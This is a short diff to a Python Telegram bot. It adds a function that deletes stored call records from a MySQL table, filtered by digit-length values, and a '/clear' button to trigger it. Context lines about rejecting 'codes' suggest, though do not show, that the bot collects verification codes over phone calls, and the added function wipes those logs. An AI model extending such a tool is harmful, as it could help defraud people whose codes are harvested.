@@ -1380,6 +1380,20 @@ Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
        send_welcome(message)
 
 
+def clear(message):
+    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
+    c = db.cursor()
+    c.execute(f"DELETE FROM `defaultdb`.`calls` WHERE (`maxdigits` = '0')")
+    db.commit()
+    c.execute(f"DELETE FROM `defaultdb`.`calls` WHERE (`maxdigits` = '1')")
+    db.commit()
+    c.execute(f"DELETE FROM `defaultdb`.`calls` WHERE (`maxdigits` = '4')")
+    db.commit()
+    c.execute(f"DELETE FROM `defaultdb`.`calls` WHERE (`maxdigits` = '6')")
+    db.commit()
+    bot.send_message(message.from_user.id,f"""*Logs Cleared*""",parse_mode='markdown')
+    db.close()
+
 
 
 
@@ -1443,6 +1457,9 @@ def handle_callback(message):
     elif message.data == '/deny_alpha':
             bot.send_message(message.from_user.id,f"""*Code Rejected ❌*""",parse_mode='markdown')
             aplha_confirm1(message,"Deny")
+
+    elif message.data == '/clear':
+            clear(message)
             
          
          
